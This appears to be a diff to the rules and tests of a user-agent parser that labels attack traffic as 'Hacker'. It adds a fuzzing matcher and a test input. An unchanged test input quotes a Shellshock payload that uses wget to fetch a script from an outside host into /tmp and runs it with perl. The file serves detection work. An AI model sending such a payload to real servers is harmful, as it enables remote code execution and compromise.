@@ -79,6 +79,8 @@ config:
     - 'HackerToolkit               :       1:"Unknown"'
 
 - test:
+#    options:
+#    - 'only'
     input:
       user_agent_string: '() { :;}; /bin/bash -c \""wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\""'
     expected:
@@ -777,9 +779,66 @@ config:
       HackerAttackVector                   : 'Spy scraper'
       HackerToolkit                        : 'Googlebot immitator'
 
-#- test:
-#    input:
-#      user_agent_string: '!(()&&!|*|*|'
+
+- matcher:
+#    options:
+#    - 'verbose'
+    require:
+    - 'IsNull[agent~"a"]'
+    - 'IsNull[agent~"e"]'
+    - 'IsNull[agent~"o"]'
+    - 'IsNull[agent~"u"]'
+    - 'IsNull[agent~"i"]'
+    extract:
+    - 'DeviceClass                        : 9:"Hacker"'
+    - 'DeviceName                         : 9:"Hacker"'
+    - 'DeviceBrand                        : 9:"Hacker"'
+    - 'DeviceVersion                      : 9:"Hacker"'
+    - 'OperatingSystemClass               : 9:"Hacker"'
+    - 'OperatingSystemName                : 9:"Hacker"'
+    - 'OperatingSystemVersion             : 9:"Hacker"'
+    - 'OperatingSystemNameVersion         : 9:"Hacker"'
+    - 'LayoutEngineClass                  : 9:"Hacker"'
+    - 'LayoutEngineName                   : 9:"Hacker"'
+    - 'LayoutEngineVersion                : 9:"Hacker"'
+    - 'LayoutEngineVersionMajor           : 9:"Hacker"'
+    - 'AgentClass                         : 9:"Hacker"'
+    - 'AgentName                          : 9:"Hacker"'
+    - 'AgentVersion                       : 9:"Hacker"'
+    - 'AgentVersionMajor                  : 9:"Hacker"'
+    - 'AgentNameVersion                   : 9:"Hacker"'
+    - 'AgentNameVersionMajor              : 9:"Hacker"'
+    - 'HackerAttackVector                 : 9:"Fuzzing"'
+    - 'HackerToolkit                      : 9:"Unknown"'
+
+- test:
+#    options:
+#    - 'only'
+    input:
+      user_agent_string: '!(()&&!|*|*|'
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Fuzzing'
+      HackerToolkit                        : 'Unknown'
 
 - test:
     input:
